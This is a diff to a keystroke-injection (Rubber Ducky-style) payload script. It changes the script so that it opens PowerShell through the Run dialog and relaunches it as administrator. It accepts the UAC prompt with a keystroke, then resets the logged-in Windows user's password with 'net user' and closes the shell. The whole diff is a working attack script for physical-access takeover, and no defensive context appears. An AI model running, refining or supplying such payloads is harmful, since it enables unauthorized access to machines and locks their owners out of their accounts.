@@ -15,18 +15,17 @@ REM You must define the new Windows user password
 DEFINE NEW_PASSWORD example
 
 DELAY 1000
-GUI x
+GUI r
+DELAY 200
+STRINGLN powershell -Command "Start-Process PowerShell -Verb RunAs"  
+DELAY 4000
+ALT j
 DELAY 500
-STRING a
-DELAY 500
-LEFT_ARROW
-DELAY 500
-ENTER
 
 DELAY 2000
 STRING net user $env:USERNAME 
-STRING NEW_PASSWORD
+STRING  NEW_PASSWORD
 ENTER
 DELAY 1000
-
-ALT F4
+STRING exit
+ENTER
